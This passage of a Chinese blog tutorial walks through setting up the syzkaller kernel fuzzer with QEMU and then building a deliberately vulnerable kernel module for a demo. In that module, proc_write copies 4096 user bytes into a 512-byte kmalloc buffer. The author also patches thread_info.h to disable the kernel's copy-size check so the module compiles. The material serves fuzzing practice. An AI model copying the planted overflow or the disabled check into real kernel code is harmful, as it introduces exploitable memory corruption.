shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export GO111MODULE=on&quot;</span> &gt;&gt; ~/.profile</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export GOPROXY=https://goproxy.cn&quot;</span> &gt;&gt; ~/.profile</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">source</span> ~/.profile</span><br></code></pre></td></tr></table></figure><p>完成。</p><p>参考<a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md">https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md</a></p><h2 id="编译Linux内核"><a href="#编译Linux内核" class="headerlink" title="编译Linux内核"></a>编译Linux内核</h2><p>git拉取linux代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/git/</span>linux.git<br>cd linux<br></code></pre></td></tr></table></figure><p>进入linux目录后使用如下命令进行配置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span> CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> defconfig<br><span class="hljs-built_in">make</span> CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> kvm_guest.config  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Coverage collection.</span><br>CONFIG_KCOV=y<br><span class="hljs-comment"># Debug info for symbolization.</span><br>CONFIG_DEBUG_INFO=y<br><span class="hljs-comment"># Memory bug detector</span><br>CONFIG_KASAN=y<br>CONFIG_KASAN_INLINE=y<br><span class="hljs-comment"># Required for Debian Stretch</span><br>CONFIG_CONFIGFS_FS=y<br>CONFIG_SECURITYFS=y<br></code></pre></td></tr></table></figure><p>注意删掉相应的注释，例如：# CONFIG_KCOV is not set，否则执行下条命令会有warning，如果不删除在之后进行qemu虚拟化时会出现Failed to start Remount Root and Kernel File Systems的错误。</p><p>再执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> olddefconfig<br>make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> -j8<br></code></pre></td></tr></table></figure><h2 id="制作文件系统"><a href="#制作文件系统" class="headerlink" title="制作文件系统"></a>制作文件系统</h2><p>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh<br>chmod +x create-image.sh<br>./create-image.sh<br></code></pre></td></tr></table></figure><p>最后可以看到stretch.id_rsa、stretch.id_rsa.pub、stretch.img这几个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cerises@ubuntu:~/linux/image$ ls<br>chroot  create-image.sh  stretch.id_rsa  stretch.id_rsa.pub  stretch.img<br></code></pre></td></tr></table></figure><h2 id="运行syzkall"><a href="#运行syzkall" class="headerlink" title="运行syzkall"></a>运行syzkall</h2><p>这里需要打开Vmware虚拟机的虚拟化。</p><p>安装qemu。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo apt-<span class="hljs-built_in">get</span> install qemu-<span class="hljs-keyword">system</span>-x86<br></code></pre></td></tr></table></figure><p>在当前目录创建boot.sh文件，文件内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br> -kernel /home/cerises/linux/arch/x86/boot/bzImage \<br> -append &quot;console=ttyS0 root=/dev/sda debug earlyprintk=serial slub_debug=QUZ&quot;\<br> -hda ./stretch.img \<br> -net user,hostfwd=tcp::10021-:22 -net nic   \<br> -enable-kvm \<br> -nographic \<br> -m 2560M \<br> -smp 2 \<br> -pidfile vm.pid \<br><span class="hljs-meta"> 2&gt;</span><span class="bash">&amp;1 | tee vm.log</span><br></code></pre></td></tr></table></figure><p>运行qemu虚拟机有登录提示输入root，无密码登录。</p><p>root@syzkaller:~# </p><p>在Vmware虚拟机使用如下命令，以是否能登录qemu虚拟机判断qemu虚拟机的ssh服务是否成功启动（syzkaller需要使用ssh）。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -<span class="hljs-selector-tag">i</span> stretch<span class="hljs-selector-class">.id_rsa</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">10021</span> -o <span class="hljs-string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost<br></code></pre></td></tr></table></figure><p>结果成功登录</p><p>进入之前下载的syzkaller目录，创建my.cfg配置文件，文件内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br>    <span class="hljs-attr">&quot;http&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br>    <span class="hljs-attr">&quot;workdir&quot;</span>: <span class="hljs-string">&quot;/home/cerises/Desktop/syzkaller/workdir&quot;</span>,<br>    <span class="hljs-attr">&quot;kernel_obj&quot;</span>: <span class="hljs-string">&quot;/home/cerises/linux&quot;</span>,<br>    <span class="hljs-attr">&quot;image&quot;</span>: <span class="hljs-string">&quot;/home/cerises/linux/image/stretch.img&quot;</span>,<br>    <span class="hljs-attr">&quot;sshkey&quot;</span>: <span class="hljs-string">&quot;/home/cerises/linux/image/stretch.id_rsa&quot;</span>,<br>    <span class="hljs-attr">&quot;syzkaller&quot;</span>: <span class="hljs-string">&quot;/home/cerises/Desktop/syzkaller&quot;</span>,<br>    <span class="hljs-attr">&quot;procs&quot;</span>: <span class="hljs-number">8</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;qemu&quot;</span>,<br>    <span class="hljs-attr">&quot;vm&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;count&quot;</span>: <span class="hljs-number">4</span>,<br>        <span class="hljs-attr">&quot;kernel&quot;</span>: <span class="hljs-string">&quot;/home/cerises/linux/arch/x86/boot/bzImage&quot;</span>,<br>        <span class="hljs-attr">&quot;cpu&quot;</span>: <span class="hljs-number">2</span>,<br>        <span class="hljs-attr">&quot;mem&quot;</span>: <span class="hljs-number">2048</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用./bin/syz-manager -config my.cfg命令运行。注意运行前需要关闭qemu虚拟机</p><p>成功运行！</p><p><img src="2022-02-18_215305.png"></p><h1 id="Syzkaller-crash-DEMO"><a href="#Syzkaller-crash-DEMO" class="headerlink" title="Syzkaller crash DEMO"></a>Syzkaller crash DEMO</h1><p>这部分参考：</p><p><a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/tree/master/docs/harbian_qa/fuzz_testing">https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/tree/master/docs/harbian_qa/fuzz_testing</a></p><p>本指南分为三个步骤：</p><ul><li>将导致堆溢出的规则添加到 syzkaller 并重建它</li><li>使用堆溢出代码编译内核</li><li>运行 syzkaller 来寻找 bug</li></ul><h2 id="向-syzkaller-添加测试规则"><a href="#向-syzkaller-添加测试规则" class="headerlink" title="向 syzkaller 添加测试规则"></a>向 syzkaller 添加测试规则</h2><p>该规则写在 $(SYZKALLER_SOURCE)/sys/ 目录下的 *.txt 文件中。它会被 syz-extract 翻译成同一目录下的 *.const 文件。然后我们可以用新规则重建 syzkaller。</p><h3 id="The-grammar-of-txt"><a href="#The-grammar-of-txt" class="headerlink" title="The grammar of *.txt"></a>The grammar of *.txt</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">open</span><span class="hljs-constructor">$proc(<span class="hljs-params">file</span> <span class="hljs-params">ptr</span>[<span class="hljs-params">in</span>, <span class="hljs-params">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], <span class="hljs-params">flags</span> <span class="hljs-params">flags</span>[<span class="hljs-params">proc_open_flags</span>], <span class="hljs-params">mode</span> <span class="hljs-params">flags</span>[<span class="hljs-params">proc_open_mode</span>])</span> fd<span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, \__O_TMPFILE<br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>系统调用的声明由系统调用名、参数和返回值组成，系统调用名的格式如下所示：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">SyscallName$<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure><p>‘’前面的”SyscallName”是系统调用的名称，内核提供的接口，’’后面的”Type”是系统调用的具体类型。在我这里的例子中：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">open</span><span class="hljs-built_in">$proc</span><br></code></pre></td></tr></table></figure><p>表示系统调用“open()”带有一个有限的tpye“proc”，名称由作者确定，限制由后续参数确定，参数格式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ArgumentName ArgumentType<span class="hljs-selector-attr">[Limit]</span><br></code></pre></td></tr></table></figure><p>ArgumentName 是 Argument 的名称，ArgumentType 是它的类型。 在我的示例中，有几种类型的参数，如字符串、标志等。“[Limit]”将限制参数的值，如果不具体，syzkaller 将生成一个随机值。</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mercury"><span class="hljs-keyword">mode</span> flags[proc_open_mode]<br>proc_open_mode <span class="hljs-built_in">=</span> ...<br></code></pre></td></tr></table></figure><p>在我们的示例中，带有 tpye “flags” 的参数 “mode” 将从 “proc_open_mode = ……” 中挑选出一些值。</p><p>声明的最后是返回值。在我的示例中，“fd”是文件描述符。</p><p>系统调用的一些一般声明写在源代码树 $(SYZKALLER_SOURCE)/sys/sys.txt 中。</p><p>在我的示例中，可以通过写入 /proc/test 来触发堆溢出。所以，我们应该将“open”中的“file”参数限制为“/proc/test”，其他人可以引用sys.txt文件。</p><p>案例的规则参考：<a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/proc_operation.txt">https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/proc_operation.txt</a></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">include</span> &lt;linux/fs.h&gt;<br><br><span class="hljs-keyword">open</span><span class="hljs-constructor">$proc(<span class="hljs-params">file</span> <span class="hljs-params">ptr</span>[<span class="hljs-params">in</span>, <span class="hljs-params">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], <span class="hljs-params">flags</span> <span class="hljs-params">flags</span>[<span class="hljs-params">proc_open_flags</span>], <span class="hljs-params">mode</span> <span class="hljs-params">flags</span>[<span class="hljs-params">proc_open_mode</span>])</span> fd<br>read<span class="hljs-constructor">$proc(<span class="hljs-params">fd</span> <span class="hljs-params">fd</span>, <span class="hljs-params">buf</span> <span class="hljs-params">buffer</span>[<span class="hljs-params">out</span>], <span class="hljs-params">count</span> <span class="hljs-params">len</span>[<span class="hljs-params">buf</span>])</span> len<span class="hljs-literal">[<span class="hljs-identifier">buf</span>]</span><br>write<span class="hljs-constructor">$proc(<span class="hljs-params">fd</span> <span class="hljs-params">fd</span>, <span class="hljs-params">buf</span> <span class="hljs-params">buffer</span>[<span class="hljs-params">in</span>], <span class="hljs-params">count</span> <span class="hljs-params">len</span>[<span class="hljs-params">buf</span>])</span> len<span class="hljs-literal">[<span class="hljs-identifier">buf</span>]</span><br>close<span class="hljs-constructor">$proc(<span class="hljs-params">fd</span> <span class="hljs-params">fd</span>)</span><br><br>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>直接在<strong>syzkaller/sys/linux/<strong>下创建</strong>proc_operation.txt</strong>文件</p><h3 id="Rebuild-syzkaller"><a href="#Rebuild-syzkaller" class="headerlink" title="Rebuild syzkaller"></a>Rebuild syzkaller</h3><p>cd 进入源代码树 $(SYZKALLER_SOURCE)，然后运行：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">make clean<br>make bin/syz-extract<br>bin<span class="hljs-regexp">/syz-extract -os linux -arch amd64 -sourcedir /</span>home<span class="hljs-regexp">/cerises/</span>linux proc_operation.txt<br>make all<br></code></pre></td></tr></table></figure><p>“syz-extract”：-arch 是您的测试机器的体系结构，-sourcedir 是内核构建树将被测试的源。</p><p>注意：关于使用您自己的系统调用描述进行重建，您也可以阅读<a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/syz_debug.md#extern-the-syscall">此内容</a>。</p><p>报错：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">cerises<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/syzkaller</span><span class="hljs-variable">$ </span>bin/syz-extract -os linux -arch amd64 -sourcedir /home/cerises/linux proc_operation.txt<br>generating linux/amd64...<br>sys/linux/<span class="hljs-symbol">proc_operation.txt:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span>: len can<span class="hljs-string">&#x27;t be syscall return</span><br><span class="hljs-string">sys/linux/proc_operation.txt:5:51: len can&#x27;</span>t be syscall <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>那就删掉len[buf]，之后一切正常。</p><h2 id="将二进制文件复制到测试机"><a href="#将二进制文件复制到测试机" class="headerlink" title="将二进制文件复制到测试机"></a>将二进制文件复制到测试机</h2><p>运行你的虚拟机，然后 cd 进入你的 syzkaller 构建目录，然后运行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>scp -P <span class="hljs-variable">$(</span>YOUR_PORT) -i ~<span class="hljs-regexp">/.ssh/rsa</span> -r syzkaller/bin root<span class="hljs-variable">@127</span>.0.0.<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-variable">$(</span>YOUR_PATH)<br></code></pre></td></tr></table></figure><ul><li> $(YOUR_PORT) 特定于您的 qemu 标志</li><li>$(YOUR_PATH) 应该添加到 VM 上的环境中。</li></ul><p>本例应该是：</p><p>cd linux/image</p><p>启动qemu</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">scp -P <span class="hljs-number">10021</span> -i .<span class="hljs-regexp">/stretch.id_rsa -r /</span>home<span class="hljs-regexp">/cerises/</span>Desktop<span class="hljs-regexp">/syzkaller/</span>bin root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-regexp">/root/</span>bin<br></code></pre></td></tr></table></figure><h2 id="内核模块溢出"><a href="#内核模块溢出" class="headerlink" title="内核模块溢出"></a>内核模块溢出</h2><p>我们将编写一个堆溢出内核模块，该模块在/proc/test下提供了一个proc文件系统接口，/proc/test的文件操作会调用堆溢出函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a</span> =</span> &#123;<br>                                .open = proc_open,<br>                                .read = proc_read,<br>                                .write = proc_write,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里只展示了一个函数（带有堆溢出代码）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">proc_write</span> <span class="hljs-params">(struct file *proc_file, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *proc_user, <span class="hljs-keyword">size_t</span> n, <span class="hljs-keyword">loff_t</span> *loff)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *c = kmalloc(<span class="hljs-number">512</span>, GFP_KERNEL);<br><br>    copy_from_user(c, proc_user, <span class="hljs-number">4096</span>);<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:into write!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将模块代码放入内核构建树并使用内核构建。</p><p>test.c 参见：<a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/test.c">https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/test.c</a></p><p>Makefile文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># at first type on ur terminal that $(uname -r) then u will get the version..</span><br><span class="hljs-comment"># that is using on ur system</span><br> <br>obj-m += test.o<br> <br>KDIR =/usr/src/linux-headers-<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span><br> <br><span class="hljs-section">all:</span><br>        <span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KDIR)</span> SUBDIRS=<span class="hljs-variable">$(PWD)</span> modules<br> <br><span class="hljs-section">clean:</span><br>        rm -rf *.o *.ko *.mod.* *.symvers *.order<br></code></pre></td></tr></table></figure><p>然后sudo  make</p><p>报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">make[2]: *** No rule to make target <span class="hljs-string">&#x27;arch/x86/entry/syscalls/syscall_32.tbl&#x27;</span>, needed by <span class="hljs-string">&#x27;arch/x86/include/generated/uapi/asm/unistd_32.h&#x27;</span>.  Stop.<br>make[1]: *** [arch/x86/Makefile:231: archheaders] Error 2<br>make[1]: Leaving directory <span class="hljs-string">&#x27;/usr/src/linux-headers-5.13.0-30-generic&#x27;</span><br>make: *** [Makefile:9: all] Error 2<br></code></pre></td></tr></table></figure><p>编译内核模块的时候，涉及到一个linux header的问题。（比如说我在5.13.0的系统下编译5.17的驱动）</p><p>解决方案是：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">在<span class="hljs-regexp">/lib/m</span>odules<span class="hljs-regexp">/ 下mkdir一个5.17-rc3/</span><br>然后cd <span class="hljs-number">5.17</span>-rc3/<br>mkdir kernel<br>ln -s <span class="hljs-regexp">/home/</span>cerises<span class="hljs-regexp">/linux ./</span><span class="hljs-keyword">source</span><br>ln -s <span class="hljs-regexp">/home/</span>cerises<span class="hljs-regexp">/linux ./</span>build<br></code></pre></td></tr></table></figure><p>然后make</p><p>Makefile如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">CONFIG_MODULE_SIG=n<br><br><br>obj-m += test<span class="hljs-selector-class">.o</span><br> <br>EXTRA_CFLAGS += -fno-stack-protector -no-pie<br>all:<br>make -C /lib/modules/<span class="hljs-number">5.17</span>-rc3/build M=$(shell pwd) modules<br>clean:<br>rm -f *<span class="hljs-selector-class">.ko</span> *<span class="hljs-selector-class">.o</span> *<span class="hljs-selector-class">.mod</span><span class="hljs-selector-class">.o</span> *<span class="hljs-selector-class">.mod</span><span class="hljs-selector-class">.c</span> *<span class="hljs-selector-class">.symvers</span> *.<span class="hljs-attribute">order</span><br></code></pre></td></tr></table></figure><p>我的系统上$(PWD)会因为找不到当前目录而无法编译，需要换成$(shell  pwd)</p><p>sudo make,又报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/cerises/linux/image/<span class="hljs-built_in">test</span>/test.c:45:10: warning: ignoring <span class="hljs-built_in">return</span> value of ‘copy_from_user’ declared with attribute ‘warn_unused_result’ [-Wunused-result]<br>   45 |          copy_from_user(c, proc_user, 4096);<br>      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>In file included from ./arch/x86/include/asm/preempt.h:7,<br>                 from ./include/linux/preempt.h:78,<br>                 from ./include/linux/spinlock.h:55,<br>                 from ./include/linux/kref.h:16,<br>                 from ./include/linux/mm_types.h:8,<br>                 from ./include/linux/buildid.h:5,<br>                 from ./include/linux/module.h:14,<br>                 from /home/cerises/linux/image/<span class="hljs-built_in">test</span>/test.c:2:<br>In <span class="hljs-keyword">function</span> ‘check_copy_size’,<br>    inlined from ‘copy_from_user’ at ./include/linux/uaccess.h:191:6,<br>    inlined from ‘proc_write’ at /home/cerises/linux/image/<span class="hljs-built_in">test</span>/test.c:45:10:<br>./include/linux/thread_info.h:227:4: error: call to ‘__bad_copy_to’ declared with attribute error: copy destination size is too small<br>  227 |    __bad_copy_to();<br>      |    ^~~~~~~~~~~~~~~<br>make[2]: *** [scripts/Makefile.build:288: /home/cerises/linux/image/<span class="hljs-built_in">test</span>/test.o] Error 1<br>make[1]: *** [Makefile:1831: /home/cerises/linux/image/<span class="hljs-built_in">test</span>] Error 2<br>make[1]: Leaving directory <span class="hljs-string">&#x27;/home/cerises/linux&#x27;</span><br>make: *** [Makefile:8: all] Error 2<br><br></code></pre></td></tr></table></figure><p>解决方法：直接修改/include/linux/thread_info.h的check_copy_size函数，注释掉__bad_copy_to()，改为return true;就可以编译过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">check_copy_size(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> bytes, <span class="hljs-keyword">bool</span> is_source)<br>&#123;<br><span class="hljs-keyword">int</span> sz = __builtin_object_size(addr, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (unlikely(sz &gt;= <span class="hljs-number">0</span> &amp;&amp; sz &lt; bytes)) &#123;<br><span class="hljs-keyword">if</span> (!__builtin_constant_p(bytes))<br>copy_overflow(sz, bytes);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_source)<br>__bad_copy_from();<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">//__bad_copy_to();</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(bytes &gt; INT_MAX))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>check_object_size(addr, bytes, is_source);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>目录下生成test.ko，说明编译成功</p><p>接下来就把模块编译进内核</p><p>把test.c cp到/linux/drivers/char/下，然后vim /linux/drivers/char/Kconfig，添加如下：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">config TEST_MODULE<br>        tristate <span class="hljs-string">&quot;Heap Overflow Test&quot;</span>       <br>        <span class="hljs-keyword">default</span> y                                           <br>        help<br>          This <span class="hljs-keyword">file</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> test a <span class="hljs-keyword">buffer</span> overflow.<br></code></pre></td></tr></table></figure><p>/linux/drivers/char/Makefile下添加</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">obj-$(CONFIG_TEST_MODULE) += test.o<br></code></pre></td></tr></table></figure><p>然后make -j8编译。</p><p>启动qemu</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@syzkaller</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls /proc/test</span><br>/<span class="hljs-built_in">proc</span>/test<br></code></pre></td></tr></table></figure><h2 id="修改配置文件并运行-syzkaller"><a href="#修改配置文件并运行-syzkaller" class="headerlink" title="修改配置文件并运行 syzkaller"></a>修改配置文件并运行 syzkaller</h2><p>为了测试文件操作，请在您的配置中启用这些选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;enable_syscalls&quot;</span>: [<br>                <span class="hljs-string">&quot;open<span 